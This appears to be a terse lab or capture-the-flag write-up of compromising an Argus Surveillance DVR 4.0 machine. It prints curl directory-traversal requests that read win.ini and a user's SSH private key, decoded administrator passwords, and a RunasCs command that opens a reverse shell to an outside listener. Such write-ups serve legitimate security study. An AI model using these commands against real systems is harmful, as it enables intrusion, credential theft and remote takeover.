nmap shows ports 8080 and 22
port 8080 is Argus Surveillance 4.0 web portal
Under users, we see Admin and "Viewer"
Searchsploit shows directory traversal and file disclosure vulnerability
We use that to confirm win.ini
```zsh
curl -s --path-as-is "http://192.168.110.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fwin.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
#works
#we try to hunt some config files, but were'nt successful
HINT TAKEN :  look for ssh key of the USER "viewer"

curl -s --path-as-is "http://192.168.110.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
#gives us the id_rsa at /Users/Viewer/.ssh/id_rsa
ssh viewver@Ip -i id_rsa
```
viewer!

---
None of the privesc techniques, nor winPEAS show any way
HINT TAKEN : Turns out, the exploit we saw earlier, which was breaking the weak encryption, mentions "C:\programdata\PY_Software\Argus Surveillance DVR\DVRParams.ini" as the file with password

When we had tried to curl - path traverse - file disclosure it earlier, it only showed the top 5 lines, for some reason, but when we cat it, we see the full file, and find 2 passwords for administrator user

ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8 == 14WatchD0g? (? = unknown)
5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE == ImWatchingY0u

For the first one, the last char is not recognized, and since the guy who made the exploit mentioned "lazy to add all special chars", we trial and error
Send over runasCS.exe
Second password doesnt work
The password that works is
`.\RunasCs.exe administrator ImWatchingY0u powershell.exe -r 192.168.45.200:9001 --force-profile --logon-type 8`
root!

---
---
---
alternatively, we could have also created a new user in the web portal, with passwords consisting of just special chars (except Hashtag, that comes blank). since each 4 bytes are mapped to a char, we could then compare which pertains to our last char